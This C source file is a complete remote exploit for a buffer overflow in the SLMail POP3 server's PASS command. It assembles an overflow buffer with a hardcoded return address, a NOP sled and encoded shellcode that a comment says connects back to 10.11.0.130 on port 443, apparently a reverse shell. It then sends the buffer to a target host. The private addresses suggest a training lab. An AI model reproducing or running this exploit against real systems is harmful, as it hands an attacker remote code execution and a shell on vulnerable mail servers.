#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h> 
#include <arpa/inet.h>

#define retadd "\x8f\x35\x4a\x5f" 
#define port 110

/* Host: 10.11.0.130; Port:443; thread safe*/
char shellcode[] =
"\xd9\xe5\xbe\xaa\x02\x6d\xbb\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x83\xc5\x04\x31\x75\x13\x03\xdf\x11\x8f\x4e\xe3\xfe\xcd"
"\xb1\x1b\xff\xb1\x38\xfe\xce\xf1\x5f\x8b\x61\xc2\x14\xd9\x8d"
"\xa9\x79\xc9\x06\xdf\x55\xfe\xaf\x6a\x80\x31\x2f\xc6\xf0\x50"
"\xb3\x15\x25\xb2\x8a\xd5\x38\xb3\xcb\x08\xb0\xe1\x84\x47\x67"
"\x15\xa0\x12\xb4\x9e\xfa\xb3\xbc\x43\x4a\xb5\xed\xd2\xc0\xec"
"\x2d\xd5\x05\x85\x67\xcd\x4a\xa0\x3e\x66\xb8\x5e\xc1\xae\xf0"
"\x9f\x6e\x8f\x3c\x52\x6e\xc8\xfb\x8d\x05\x20\xf8\x30\x1e\xf7"
"\x82\xee\xab\xe3\x25\x64\x0b\xcf\xd4\xa9\xca\x84\xdb\x06\x98"
"\xc2\xff\x99\x4d\x79\xfb\x12\x70\xad\x8d\x61\x57\x69\xd5\x32"
"\xf6\x28\xb3\x95\x07\x2a\x1c\x49\xa2\x21\xb1\x9e\xdf\x68\xde"
"\x53\xd2\x92\x1e\xfc\x65\xe1\x2c\xa3\xdd\x6d\x1d\x2c\xf8\x6a"
"\x62\x07\xbc\xe4\x9d\xa8\xbd\x2d\x5a\xfc\xed\x45\x4b\x7d\x66"
"\x95\x74\xa8\x29\xc5\xda\x03\x8a\xb5\x9a\xf3\x62\xdf\x14\x2b"
"\x92\xe0\xfe\x44\x39\x1b\x69\x61\xb5\x23\xbd\x1d\xcb\x23\x3c"
"\x65\x42\xc5\x54\x89\x03\x5e\xc1\x30\x0e\x14\x70\xbc\x84\x51"
"\xb2\x36\x2b\xa6\x7d\xbf\x46\xb4\xea\x4f\x1d\xe6\xbd\x50\x8b"
"\x8e\x22\xc2\x50\x4e\x2c\xff\xce\x19\x79\x31\x07\xcf\x97\x68"
"\xb1\xed\x65\xec\xfa\xb5\xb1\xcd\x05\x34\x37\x69\x22\x26\x81"
"\x72\x6e\x12\x5d\x25\x38\xcc\x1b\x9f\x8a\xa6\xf5\x4c\x45\x2e"
"\x83\xbe\x56\x28\x8c\xea\x20\xd4\x3d\x43\x75\xeb\xf2\x03\x71"
"\x94\xee\xb3\x7e\x4f\xab\xd4\x9c\x45\xc6\x7c\x39\x0c\x6b\xe1"
"\xba\xfb\xa8\x1c\x39\x09\x51\xdb\x21\x78\x54\xa7\xe5\x91\x24"
"\xb8\x83\x95\x9b\xb9\x81";
 
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2975);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(13);
    memset(nop, 0x00, 13);
    memset(nop, 0x90, 13);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.10.130");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
